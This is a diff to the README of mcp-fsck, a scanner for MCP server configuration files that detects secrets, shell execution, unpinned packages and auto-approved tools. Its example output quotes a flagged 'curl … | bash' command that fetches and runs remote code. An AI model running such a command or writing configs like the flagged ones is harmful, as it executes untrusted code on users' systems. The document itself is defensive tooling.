@@ -46,6 +46,8 @@ line counts findings by severity. Clean scans exit `0`; findings at or above
 | `--fail-on <sev>` | exit `1` when findings ≥ severity (default `high`; `none` to disable) |
 | `--timeout <ms>` | per-server deep-mode timeout (default `10000`) |
 
+Exit `0` when nothing reaches the gate. Exit `1` when a finding does. Exit `2` when the scan itself cannot run (missing path, bad `--fail-on`, unreadable baseline). Servers inside a file are listed worst grade first. The first line is the overall grade.
+
 ### In CI
 
 ```yaml
@@ -83,21 +85,23 @@ Every later scan suppresses those findings (and reports `N suppressed`), so
 
 | Rule | Severity | Detects |
 |---|---|---|
-| `MCP001` secrets-in-config | high | API keys, tokens and private key material in plaintext configs — including credentials passed as CLI args or embedded in URLs |
+| `MCP001` secrets-in-config | high | API keys, tokens and private key material in plaintext configs — including `Bearer` values, `--token=…` flags, and credentials embedded in URLs |
 | `MCP002` shell-metachar-execution | critical/medium | `sh -c`/`cmd /c`/`npx -c` command strings, pipes-to-shell, command substitution, runtime base64 decoding |
 | `MCP003` inline-code-execution | medium | interpreters invoked with `-e`/`-c` instead of reviewed files |
 | `MCP004` auto-install-unpinned-package | medium | `npx -y`, `bunx`, `pnpm dlx`, `npm exec`, `uvx` re-resolving code at every startup — including `@latest`/range tags that look pinned but aren't (the *MCP rug pull*) |
 | `MCP005` unverified-publisher | info | packages not from a known official MCP publisher |
-| `MCP006` insecure-transport | high | remote MCP servers over plain HTTP |
+| `MCP006` insecure-transport | high | remote MCP servers over plain HTTP or `ws://` |
 | `MCP007` remote-credentials-in-config | medium | bearer tokens / API keys in headers |
 | `MCP008` broad-filesystem-scope | high | filesystem servers granted `/`, `~`, `.` or your whole home directory |
 | `MCP009` world-writable-config | high | configs other local users can modify to re-tool your agent |
 | `MCP010` config-drift | low | the same server name defined with different code across clients |
-| `MCP014` typosquat-lookalike-package | medium | a package reusing an official server's name under a different scope |
+| `MCP014` typosquat-lookalike-package | medium | a package reusing an official server's name, a one-character misspelling, or non-ASCII lookalikes |
 | `MCP015` suspicious-server-name | medium | invisible/non-ASCII characters disguising one server as another |
 | `MCP016` tools-auto-approved | medium/high | `alwaysAllow`/`autoApprove` lists skipping consent prompts (`*` = high) |
+| `MCP017` config-parse-error | high | a config file that exists but could not be read or parsed, so its servers were not audited |
 
 Entries marked `enabled = false` / `disabled = true` are skipped entirely.
+A file that fails to parse does **not** count as a clean scan: `MCP017` fails the default `--fail-on high` gate.
 
 **With `--deep`** — handshakes each server via `initialize` + `tools/list`, never executes tools:
 
@@ -110,19 +114,19 @@ Entries marked `enabled = false` / `disabled = true` are skipped entirely.
 Example output:
 
 ```text
-  mcp-fsck v0.2.0 — integrity check for MCP server configs
-  scanned 1 config file · 4 servers · 9 findings (1 critical, 4 high, 4 medium)
+  mcp-fsck v0.3.0 — integrity check for MCP server configs
+  overall grade F · scanned 1 config file · 5 servers · 8 findings (1 critical, 3 high, 3 medium, 1 info)
 
-  ~/.claude.json
-    filesystem (npx)  grade D (score 35, 2 findings)
+  explicit examples/risky.mcp.json
+    updater (sh)  grade F (score 40, 1 finding)
+     CRITICAL  [MCP002] shell-metachar-execution
+        Shell command built with metacharacters
+        evidence: sh -c curl https://install.example/setup.sh | bash
+        → Run the underlying binary directly instead of routing through a shell …
+    fs-root (npx)  grade D (score 35, 2 findings)
      HIGH  [MCP008] broad-filesystem-scope
         Filesystem server granted root-level scope
         …
-    sketchy-updater (sh)  grade F (score 75, 3 findings)
-     CRITICAL  [MCP002] shell-metachar-execution
-        Shell command built with metacharacters
-        evidence: sh -c curl https://example.com/install.sh | bash
-        → Run the underlying binary directly instead of routing through a shell …
 ```
 
 ## Supported clients
@@ -130,15 +134,16 @@ Example output:
 | Client | Config locations scanned |
 |---|---|
 | Claude Desktop | `claude_desktop_config.json` (per-OS app dir) |
-| Claude Code | `~/.claude.json`, project `.mcp.json` |
+| Claude Code | `~/.claude.json` (user `mcpServers` and per-project `projects.<path>.mcpServers`; `CLAUDE_CONFIG_DIR` is honored), project `.mcp.json` |
 | Cursor | `~/.cursor/mcp.json`, project `.cursor/mcp.json` |
-| VS Code / VSCodium / Insiders | `User/mcp.json`, project `.vscode/mcp.json` |
+| VS Code / VSCodium / Insiders | `User/mcp.json`, each profile's `mcp.json`, project `.vscode/mcp.json` |
 | Windsurf | `~/.codeium/windsurf/mcp_config.json` |
 | Cline / Roo Code / Kilo Code | editor `globalStorage/*/settings/*mcp_settings.json` |
 | Zed | `~/.config/zed/settings.json` (`context_servers`) |
 | Gemini CLI | `~/.gemini/settings.json`, project `.gemini/settings.json` |
 | Codex CLI | `~/.codex/config.toml`, project `.codex/config.toml` (TOML) |
 | JetBrains Junie | `~/.junie/mcp/mcp.json` |
+| Amazon Q Developer | `~/.aws/amazonq/mcp.json`, project `.amazonq/mcp.json` |
 
 Configs are parsed tolerantly — JSONC comments/trailing commas, non-string
 args and env values, and TOML for Codex — so real-world files never silently
@@ -149,7 +154,14 @@ scan as empty.
 `--deep` speaks just enough MCP to call `initialize` and `tools/list`. It
 **never invokes any tool**, runs servers with a minimal environment (only
 `PATH`/`HOME`/locale plus the env the config itself declares), and kills
-non-responders at the timeout.
+non-responders — and child processes they spawned — at the timeout.
+
+Stdio servers may answer with newline-delimited JSON or legacy
+`Content-Length` frames. Remote `http` / `streamable-http` servers get a
+streamable-HTTP handshake (session id included). `sse` servers are read from
+the endpoint event. Credential headers and URL userinfo are **not** sent to
+non-local plain HTTP; that shows up as a warning, and the static rules still
+flag the config. WebSocket servers are not enumerated.
 
 It does *start the server processes* — which for `npx`-style entries may
 download packages. Only use `--deep` on configs you control, and treat it like
@@ -183,8 +195,7 @@ stays with you.
 
 ```bash
 npm install
-npm run build        # tsup → dist/
-npm test             # vitest — unit + live-handshake + CLI e2e tests
+npm test             # builds dist/, then vitest — unit + live-handshake + CLI e2e tests
 npm run typecheck
 ```
 
